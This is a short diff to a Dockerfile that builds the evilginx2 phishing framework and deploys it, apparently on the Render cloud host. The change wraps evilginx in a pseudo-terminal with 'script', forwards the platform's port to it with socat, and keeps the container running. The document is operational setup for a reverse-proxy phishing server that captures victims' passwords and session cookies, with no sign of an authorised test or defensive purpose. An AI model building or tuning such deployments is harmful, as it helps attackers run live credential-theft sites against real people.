@@ -5,7 +5,7 @@ WORKDIR /go/evilginx2
 RUN make
 
 FROM alpine:latest
-RUN apk add --no-cache ca-certificates socat bash
+RUN apk add --no-cache ca-certificates socat bash util-linux
 WORKDIR /app
 COPY --from=builder /go/evilginx2/build/evilginx /app/evilginx
 
@@ -14,5 +14,5 @@ RUN mkdir /app/phishlets
 
 EXPOSE 80 443
 
-# Start evilginx and map Render's dynamic port to Evilginx's port 80
-CMD ["/bin/sh", "-c", "socat TCP-LISTEN:${PORT:-8080},fork TCP:127.0.0.1:80 & /app/evilginx"]
+# Start the port forwarder, run Evilginx in a pseudo-terminal, and keep the container alive
+CMD ["/bin/sh", "-c", "socat TCP-LISTEN:${PORT:-8080},fork TCP:127.0.0.1:80 & script -q -c '/app/evilginx' /dev/null & tail -f /dev/null"]
